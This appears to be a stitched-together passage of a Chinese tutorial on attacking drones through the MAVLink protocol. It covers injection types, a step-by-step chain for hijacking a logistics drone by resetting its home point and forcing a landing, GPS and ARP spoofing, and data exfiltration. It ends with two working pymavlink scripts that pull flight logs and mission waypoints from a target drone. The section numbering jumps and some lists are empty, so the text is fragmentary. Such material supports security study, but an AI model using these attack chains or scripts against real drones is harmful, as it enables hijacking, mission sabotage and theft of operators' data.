1. 注入攻击理论基础

1.1 什么是注入攻击?

注入攻击(Injection Attack)是指攻击者向无人机系统输入恶意数据或命令,使系统执行非预期的操作。在无人机场景中,注入攻击主要针对MAVLink通信协议。

2.1.2 关键安全缺陷分析
缺陷类型 详细描述 安全影响
无消息认证 接收方无法验证消息来源的合法性 任何人都可以伪造消息
无完整性保护 MAVLink 1.0仅有CRC,无法防篡改 消息可被中间人修改
明文传输 所有数据以明文形式传输 敏感信息可被窃取
无重放保护 缺少时间戳或序列号验证 攻击者可重放捕获的消息
签名未广泛部署 MAVLink 2的签名特性默认关闭 即使有签名也常未启用

2.1.4 注入攻击向量分类

1. 命令注入

  • 目标: 改变无人机行为
  • 方法: 发送伪造的COMMAND_LONG消息
  • 示例: 强制切换飞行模式、触发返航

2. 遥测注入

  • 目标: 欺骗地面站显示
  • 方法: 发送伪造的GLOBAL_POSITION_INT消息
  • 示例: 让地面站显示错误的位置

3. 任务注入

  • 目标: 修改飞行任务
  • 方法: 发送伪造的MISSION_ITEM消息
  • 示例: 添加恶意航点

4. 传感器注入

  • 目标: 破坏传感器融合
  • 方法: 发送伪造的GPS_INPUT或RAW_IMU消息
  • 示例: GPS欺骗、IMU欺骗
2.1.5 攻击场景分析

场景1:物流无人机劫持

攻击链:

  1. 被动扫描发现目标无人机的MAVLink通信
  2. 解析通信获取系统ID和组件ID
  3. 注入SET_HOME_POSITION修改返航点
  4. 注入LAND模式强制降落
  5. 在攻击者控制的地点捕获无人机

场景2:侦察任务干扰

攻击链:

  1. 监听MAVLink链路获取任务信息
  2. 注入MISSION_ITEM添加偏离航点
  3. 注入MOUNT_CONTROL干扰云台方向
  4. 使侦察任务失败或获取错误情报

5.1.2 GPS注入攻击的技术原理

GPS数据注入攻击利用MAVLink的GPS_INPUT消息接口,模拟一个物理GPS单元。这种攻击与传统GPS欺骗有本质区别:

传统GPS欺骗(物理层)

攻击路径:

1

攻击者 → 信号发生器 → 射频信号 → GPS天线 → GPS芯片 → 飞控

优点:

缺点:

  • 需要靠近目标

攻击路径:

1

攻击者 → 网络接口 → MAVLink消息 → 飞控GPS融合 → 状态估计

优点:

  • 不需要特殊硬件
  • 可以远程执行
  • 实施简单

缺点:

  • 仅适用于支持MAVLink GPS的系统
  • 需要网络访问权限
  • 可以通过消息签名防御

ARP欺骗涉及向网络发送虚假的ARP(地址解析协议)消息,将攻击者的MAC地址与目标设备(在此情况下为GCS)的IP地址关联。这允许攻击者拦截、修改或阻止到目标设备的通信,有效地控制无人机的通信。

1. 数据渗漏攻击理论基础

1.1 什么是数据渗漏?

数据渗漏(Exfiltration)是指攻击者从无人机系统中窃取敏感信息的过程,而不需要修改或控制无人机的飞行行为。这些攻击可以被动地执行,使操作员很难检测。

与注入攻击不同,数据渗漏攻击的目标是信息窃取而非行为控制。这使得攻击更加隐蔽,因为:

  • 不改变无人机飞行行为
  • 不产生明显的异常
  • 可以长期持续进行
  • 难以被常规安全检测发现

3. 参数提取

3.1 理论知识

飞行控制器将其所有运行时配置存储在参数表中,包括故障安全触发器、飞行模式设置、传感器校准、地理围栏数据等。这些参数可以通过MAVLink消息或文件下载(例如MAVFTP)提取,而无需修改或控制无人机的飞行行为。

4. WiFi客户端数据泄露

4.1 理论知识

当无人机创建自己的WiFi网络(如配套计算机AP或WiFi遥测桥接器)时,所有连接的客户端——GCS、操作员笔记本电脑、平板电脑——在同一共享介质上传输和接收数据。如果加密薄弱或损坏(例如,破解的WEP或开放的AP),攻击者可以嗅探此流量并捕获有价值的元数据、明文HTTP会话、ARP广播、DNS查询,甚至泄露的凭据。

此场景专注于被动监控连接设备的数据泄露,而不主动发送流量。

import sys
from pymavlink import mavutil

def list_logs(connection):
    connection.mav.log_request_list_send(
        connection.target_system,
        connection.target_component,
        0, 0xffff
    )
    
    logs = []
    while True:
        msg = connection.recv_match(type=['LOG_ENTRY'], blocking=True, timeout=5)
        if msg is None:
            break
        logs.append(msg)
    
    return logs

def download_log(connection, log_id, log_size, filename):
    with open(filename, 'wb') as file:
        bytes_received = 0
        ofs = 0
        
        while bytes_received < log_size:
            connection.mav.log_request_data_send(
                connection.target_system,
                connection.target_component,
                log_id,
                ofs,
                90
            )
            
            while True:
                msg = connection.recv_match(type=['LOG_DATA'], 
                                          blocking=True, timeout=5)
                if msg is None:
                    break
                if msg.id != log_id or msg.ofs != ofs:
                    continue
                
                data = bytes(msg.data)
                file.write(data)
                bytes_received += len(data)
                ofs += len(data)
                print(f"已接收 {bytes_received}/{log_size} 字节")
                break

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("用法: python log-extract.py <connection_string> <log_id>")
        sys.exit(1)
    
    connection_string = sys.argv[1]
    log_id = int(sys.argv[2])
    
    connection = mavutil.mavlink_connection(connection_string)
    connection.wait_heartbeat()
    
    logs = list_logs(connection)
    for log in logs:
        print(f"日志ID: {log.id}, 大小: {log.size}, 时间: {log.time_utc}")
    
    log_to_download = next((log for log in logs if log.id == log_id), None)
    
    if log_to_download:
        download_log(connection, log_to_download.id, 
                    log_to_download.size, f"log_{log_id}.bin")
        print(f"日志 {log_id} 下载成功。")
    else:
        print(f"未找到日志ID {log_id}。")
EOF

from pymavlink import mavutil

# 连接到无人机
master = mavutil.mavlink_connection("tcp:10.13.0.3:5760")
master.wait_heartbeat()
print("已连接到无人机。")

# 请求任务项列表
master.mav.mission_request_list_send(master.target_system,
                                     master.target_component)

waypoints = []
print("[+] 正在提取任务...")

while True:
    msg = master.recv_match(type=["MISSION_COUNT", "MISSION_ITEM_INT"],
                           blocking=True, timeout=5)
    if msg is None:
        break
    
    if msg.get_type() == "MISSION_COUNT":
        print(f"[!] 预期 {msg.count} 个任务项...")
    elif msg.get_type() == "MISSION_ITEM_INT":
        waypoints.append(msg)
        print(f"航点 #{msg.seq}: lat={msg.x/1e7:.6f}, "
              f"lon={msg.y/1e7:.6f}, alt={msg.z}m")
        
        if len(waypoints) == msg.seq + 1:
            break

# 将提取的航点保存到文件
with open("mission_dump.txt", "w") as f:
    f.write("序列号,命令,帧,纬度,经度,高度\n")
    for wp in waypoints:
        f.write(f"{wp.seq},{wp.command},{wp.frame},"
                f"{wp.x/1e7:.6f},{wp.y/1e7:.6f},{wp.z}\n")

print(f"[!] 任务提取完成。已保存到 mission_dump.txt")
print(f"[!] 共提取 {len(waypoints)} 个航点")
